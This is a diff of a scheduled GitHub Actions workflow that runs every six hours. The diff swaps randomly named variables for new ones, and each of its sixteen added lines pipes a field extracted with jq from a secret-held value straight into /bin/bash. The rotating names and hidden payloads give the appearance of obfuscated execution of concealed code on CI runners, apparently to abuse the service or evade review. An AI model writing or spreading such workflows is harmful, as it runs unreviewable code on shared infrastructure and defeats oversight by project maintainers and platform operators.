@@ -2,28 +2,32 @@ name: tianbaojizi
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 3/6 * * *'
-jobs:  # 23799
+    - cron: '26 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: tianbaojizi
         env:
-          vx5: ${{ secrets.vx5 }}
+          unuz79: ${{ secrets.unuz79 }}
         run: |
-          echo $vx5 | jq -r .cvook089 | /bin/bash
-          echo $raklj89558 | jq -r .dcwu94494 | /bin/bash
-          echo $hi4412 | jq -r .kzv72398 | /bin/bash
-          echo $n041 | jq -r .fp74 | /bin/bash
-          echo $td3522 | jq -r .mwp0976 | /bin/bash
-          echo $t70215 | jq -r .hh5 | /bin/bash
-          echo $p25301 | jq -r .jm5454 | /bin/bash
-          echo $nfwn6823 | jq -r .bg5 | /bin/bash
-          echo $tin76513 | jq -r .toho487 | /bin/bash
-          echo $mjx895 | jq -r .d33 | /bin/bash
-          echo $wdb77 | jq -r .pthk04 | /bin/bash
-          echo $s814 | jq -r .kdu6 | /bin/bash
-          echo $ekusn9480 | jq -r .vl35 | /bin/bash
-          echo $m31 | jq -r .tahe884 | /bin/bash
+          echo $unuz79 | jq -r .ost69132 | /bin/bash
+          echo $ck10 | jq -r .r9 | /bin/bash
+          echo $rqie070 | jq -r .nt34 | /bin/bash
+          echo $j64 | jq -r .a093 | /bin/bash
+          echo $vyru234 | jq -r .vwd33132 | /bin/bash
+          echo $vk445 | jq -r .mwzx3 | /bin/bash
+          echo $mezj48 | jq -r .yv35 | /bin/bash
+          echo $nfd1119 | jq -r .ftuz89 | /bin/bash
+          echo $t0 | jq -r .vwlp5917 | /bin/bash
+          echo $hawhx19765 | jq -r .sve28552 | /bin/bash
+          echo $nfxh52945 | jq -r .omcfl7 | /bin/bash
+          echo $t5 | jq -r .ruwa1 | /bin/bash
+          echo $urxw377 | jq -r .bjhtu7521 | /bin/bash
+          echo $ewtm404 | jq -r .ofvzh42594 | /bin/bash
+          echo $ro07348 | jq -r .zyh1574 | /bin/bash
+          echo $whsv6636 | jq -r .e6 | /bin/bash
 
